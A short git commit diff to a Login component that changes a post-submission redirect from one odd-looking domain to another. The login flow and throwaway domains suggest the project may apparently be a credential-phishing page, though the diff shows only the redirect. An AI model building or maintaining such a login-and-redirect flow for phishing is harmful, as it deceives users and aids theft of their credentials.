bd6f3b654c7dc91c2468bbc27a3728845bb1c0b9
husknet <127146284+husknet@users.noreply.github.com>
2025-02-18 13:13:46 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://tb.logline-mlzroloft.top/';
+      window.location.href = 'https://tb.cookbarter.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
